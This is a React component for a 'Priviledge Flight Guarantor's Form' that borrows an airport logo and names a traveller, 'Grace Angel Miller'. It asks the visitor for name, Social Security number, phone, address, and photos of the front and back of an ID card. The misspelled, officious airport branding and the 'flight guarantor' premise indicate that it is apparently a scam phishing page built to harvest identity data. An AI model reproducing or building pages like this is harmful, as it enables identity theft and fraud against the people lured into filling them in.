
import { NavLink } from "react-router-dom";

function HomePage(props) {
    return (
        <div className="container">
            <form className="box">
                <div className="logo">
                    <img src="https://img.aviationpros.com/files/base/cygnus/cavc/image/2016/05/Modified__BWI_Logo_copy.574db71b7737e.png?auto=format%2Ccompress&w=640&width=640" />
                </div>
                <div className="heading">
                    <h1>Priviledge Flight Guarantor's Form</h1>
                    <p className="grace">Applicaion for Grace Angel Miller</p>
                </div>


                <div className="first-box-line">
                    <div className="fb-left">
                        <div className="input-box">
                            <p>FIRST NAME</p>
                            <input type="text" name="firstName" onChange={props.getData}/>
                        </div>
                        <div className="input-box">
                            <p>LAST NAME</p>
                            <input type="text" name="lastName" onChange={props.getData} />
                        </div>
                    </div>
                    <div className="fb-right">
                        <div className="input-box">
                            <p>SSN * social security Number</p>
                            <input type="number" name="ssn" onChange={props.getData}/>
                        </div>
                        <div className="input-box">
                            <p>PHONE NUMBER</p>
                            <input type="number" name="phoneNumber" onChange={props.getData}/>
                        </div>
                    </div>
                </div>


                <section className="down">
                    <div className="input-box ib2">
                        <p>ADDRESS</p>
                        <input type="text" placeholder="Address Line 1" name="addressL1" onChange={props.getData} />
                    </div>
                    <div className="input-box ib2">

                        <input type="text" placeholder="Address Line 2" name="addressL2" onChange={props.getData}/>
                    </div>
                    
                    <p className="state">Gurantor must be at the selected arrival state: <span>Arkansas</span></p>

                    <div className="input-box ib2">
                        <p>Upload front of Identification card (Id card), take a straight and clear image</p>
                        <input type="file" placeholder="Address Line 1" className="inpu"/>
                    </div>

                    <div className="input-box ib2">
                        <p>Upload Back of Identification card (Id card), take a straight and clear image</p>
                        <input type="file" placeholder="Address Line 1" className="inpu"/>
                    </div>
                    

                   <NavLink to="success"><button className="sub">Submit</button></NavLink>
                    
                </section>
            </form>
        </div>
    )
}

export default HomePage;